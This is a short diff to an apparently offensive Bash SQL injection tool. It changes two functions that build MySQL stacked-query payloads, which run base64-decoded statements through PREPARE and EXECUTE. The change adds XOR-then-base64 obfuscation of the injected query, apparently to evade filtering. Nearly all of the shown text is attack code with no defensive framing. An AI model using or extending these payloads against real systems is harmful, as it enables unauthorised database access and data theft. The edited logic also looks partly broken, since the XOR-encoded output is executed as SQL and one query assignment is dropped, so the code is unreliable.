@@ -136,6 +136,7 @@ vector_sqli_agressor_left() {
 
         local defiance_tamper_path=""
         local final_query=""
+        local raw_payload="$query_payload"
         local hex_xor=$(xor_engine "$raw_payload") 
         local b64_payload=$(base64_engine "$hex_xor")
         defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
@@ -195,10 +196,10 @@ vector_sqli_agressor_right() {
 
         local defiance_tamper_path=""
         local final_query=""
-        local b64_payload=$(base64_engine "$query_payload")
-        
+        local raw_payload="$query_payload"
+        local hex_xor=$(xor_engine "$raw_payload") 
+        local b64_payload=$(base64_engine "$hex_xor")
         defiance_tamper_path="'; SET @s=FROM_BASE64('${b64_payload}'); PREPARE stmt FROM @s; EXECUTE stmt;--"
-        final_query="${default_path}${defiance_tamper_path}"
 
                 if [[ "$WORDLIST_MYSQL" == *"nonphp"* || "$WORDLIST_MYSQL" == *"HAHA"* ]]; then
             final_query="${default_path}${defiance_tamper_path}"
